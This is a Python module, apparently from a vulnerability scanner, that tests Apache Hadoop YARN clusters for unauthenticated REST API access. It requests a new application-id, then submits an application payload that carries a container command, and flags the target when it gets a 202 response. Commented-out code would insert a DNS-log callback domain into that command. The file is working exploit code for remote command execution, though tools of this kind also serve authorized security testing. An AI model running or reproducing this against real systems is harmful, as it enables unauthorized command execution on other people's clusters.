#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def apache_hadoop_unauthorized_scan(self, url):
    ''' YARN默认开放REST API, 允许用户直接通过API进行相关的应用创建、任务提交执行等操作, 
        如果配置不当, 将会导致REST API未授权访问, 攻击者可利用其执行远程命令
    '''
    # sessid = '3861eb6b3d023d464efe85aa01277d27'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unAuthorized'
    vul_info['vul_id'] = 'ApacheHadoop-unAuth'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'application/json'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in range(len(self.apache_hadoop_unauthorized_payloads)):
        # md = random_md5()                                       # * 随机md5值, 8位
        # dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = self.apache_hadoop_unauthorized_payloads[payload]['path']
        data = self.apache_hadoop_unauthorized_payloads[payload]['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            if (payload == 0):                                                  # * 获取application-id
                res1 = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res1.status_code, res1)                # * LOG

                try:
                    if (res1.json()['application-id']):
                        self.application_id = res1.json()['application-id']
                        continue
                except:
                    return None

            # command = data['am-container-spec']['commands']['command']
            # data['am-container-spec']['commands']['command'] = command.replace('DNSdomain', dns_domain)
            data['application-id'] = self.application_id

            res2 = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                json=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res2.status_code, res2)                    # * LOG


            # todo 判断
            if (res2.status_code == 202):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res2
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None